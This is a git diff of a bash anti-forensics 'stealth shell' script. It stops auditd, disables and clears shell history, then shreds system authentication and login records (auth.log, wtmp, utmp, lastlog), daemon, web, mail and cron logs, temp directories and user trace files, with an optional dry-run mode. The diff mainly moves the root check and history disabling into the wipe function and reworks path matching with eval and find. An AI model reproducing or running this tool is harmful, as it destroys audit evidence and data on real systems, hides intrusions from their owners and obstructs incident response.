@@ -14,31 +14,8 @@ echo """
 for arg in "$@"; do
   if [[ "$arg" == "--dry-run" ]]; then
     DRY_RUN=true
-    echo "[*] DRY RUN MODE ENABLED: No files will be deleted."
   fi
 done
-
-# Ensure script is run as root
-if [ "$EUID" -ne 0 ]; then
-  echo "[-] This script must be run as root!"
-  exit 1
-fi
-
-# Stopping auditd only if systemd is available
-if command -v systemctl &>/dev/null && pidof systemd &>/dev/null; then
-  systemctl stop auditd 2>/dev/null
-fi
-
-# Disable all history tracking 
-unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST
-export HISTSIZE=0
-history -c
-
-# Capture session info
-MY_TTY=$(tty)
-MY_USER=$(whoami)
-
-echo "[*] Stealth shell started on $MY_TTY as $MY_USER"
 
 # Define cleanup function
 clean_paths() {
@@ -46,41 +23,70 @@ clean_paths() {
   shift
   echo "[*] Cleaning group: $group"
 
-  for path in "$@"; do
-    matches=$(find / -path "$path" 2>/dev/null)
-    for match in $matches; do
-      if [ -f "$match" ]; then
-        if [ "$DRY_RUN" = true ]; then
-          echo "  [DRY-RUN] Would shred & delete file: $match"
+  for pattern in "$@"; do
+    # Expand globs (for absolute paths) or search by name (if relative pattern)
+    if [[ "$pattern" == /* ]]; then
+      files=( $(eval ls -d $pattern 2>/dev/null) )
+    else
+      files=( $(find / -name "$pattern" 2>/dev/null) )
+    fi
+
+    for f in "${files[@]}"; do
+      if [ -f "$f" ]; then
+        if [ "$DRY_RUN" = true ]; then 
+          echo "  [DRY-RUN] Would shred & delete: $f"
         else
-          echo "  [-] Shredding file: $match"
-          shred -zun 3 "$match" || > "$match"
-          rm -f "$match"
+          echo "  [-] Shredding file: $f"
+          shred -zun 3 "$f" || > "$f"
+          rm -f "$f"
         fi
-      elif [ -d "$match" ]; then
+      elif [ -d "$f" ]; then
         if [ "$DRY_RUN" = true ]; then
-          echo "  [DRY-RUN] Would remove directory: $match"
+          echo "  [DRY-RUN] Would remove dir: $f"
         else
-          echo "  [-] Removing directory: $match"
-          rm -rf "$match"
+          echo "  [-] Removing directory: $f"
+          rm -rf "$f"
         fi
       fi
     done
   done
 }
 
+
 # Define paths
 CORE_LOGS=(/var/log/auth.log /var/log/secure /var/log/messages /var/log/syslog /var/log/user.log /var/log/wtmp /var/log/utmp /var/run/utmp /etc/wtmp /etc/utmp /var/log/lastlog)
-SHELL_HISTORY=(*/*_history */.history */.login */.logout */.bash_logout)
-DAEMON_LOGS=(/var/log/dpkg.log /var/log/yum.log /var/log/daemon/*.log /var/log/daemons/*.log /var/log/kern.log /var/log/acct /var/account/pacct)
+SHELL_HISTORY=(*_history .history .login .logout .bash_logout)
+DAEMON_LOGS=(/var/log/dpkg.log /var/log/yum.log /var/log/dnf*.log /var/log/daemon/*.log /var/log/daemons/*.log /var/log/kern.log /var/log/acct /var/account/pacct)
 APP_LOGS=(/var/log/qmail /var/log/smtpd /var/log/mail.log /var/log/mail/errors.log /etc/mail/access /var/log/apache2/*.log /var/log/httpd/*.log /etc/httpd/logs/*.log /usr/local/apache/logs/* /var/log/nginx/*.log /var/log/proftpd/* /var/log/xferlog /var/log/cups/* /var/log/thttpd_log)
 MISC_LOGS=(/var/log/news/* /var/log/news.* /var/log/poplog /var/log/spooler /var/log/bandwidth /var/log/explanations /var/log/ncftpd/misclog.txt)
 CRON_PATHS=(/var/log/cron/*)
 TEMP_DIRS=(/tmp/* /var/tmp/* /dev/shm/*)
-USER_TRACES=(*/.cache */.local/share/recently-used.xbel */.config/gtk-3.0/bookmarks */.Xauthority, */.git/logs)
+USER_TRACES=(.cache .local/share/recently-used.xbel .config/gtk-3.0/bookmarks .Xauthority, .git/logs)
 
 # Wiper function
 cleanup_and_exit() {
+  # Ensure script is run as root
+  if [ "$EUID" -ne 0 ]; then
+    echo "[-] This script must be run as root!"
+    exit 1
+  fi
+  
+  # Stopping auditd only if systemd is available
+  if command -v systemctl &>/dev/null && pidof systemd &>/dev/null; then
+    systemctl stop auditd 2>/dev/null
+  fi
+  
+  # Disable all history tracking 
+  unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST
+  export HISTSIZE=0
+  history -c
+  history -w
+  
+  # Capture session info
+  MY_TTY=$(tty)
+  MY_USER=$(whoami)
+  
+  echo "[*] Stealth shell started on $MY_TTY as $MY_USER"
   echo "[*] Running cleanup..."
 
   clean_paths "Core Logs" "${CORE_LOGS[@]}"
